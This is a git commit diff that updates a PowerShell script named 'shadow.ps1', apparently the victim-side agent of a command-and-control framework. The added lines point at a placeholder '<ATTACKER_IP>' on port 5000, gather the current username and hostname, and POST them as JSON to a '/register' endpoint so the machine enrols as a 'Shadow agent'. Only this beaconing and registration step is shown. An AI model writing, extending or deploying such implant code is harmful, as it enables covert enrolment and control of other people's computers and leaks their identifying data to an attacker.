8f8d2bec8e12333e78194c9521dea3fe356217a7
kagehayashi <kagehayashi@github.com>
2021-09-19 17:49:50 -0700

    Updated powershell agent script

--- agent/shadow.ps1
+++ agent/shadow.ps1
@@ -1,2 +1,22 @@
+$ip = "<ATTACKER_IP>"
+$port = 5000
+
 $host_name = [System.Net.Dns]::GetHostName()
+# $user_name = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$user_name = $env:USERNAME
 $sentinel_link = ("http://" + $ip + ":" + $port)
+
+$data = @{"username" = $user_name;
+"hostname" = $host_name;
+} | ConvertTo-Json
+
+
+function register() {
+    # Registers self as a new Shadow agent.
+    try {
+        $response = Invoke-WebRequest -Uri ($sentinel_link + "/register") -Method Post -Body $data -ContentType "application/json"
+    }
+    catch {
+        throw $_
+    }
+}
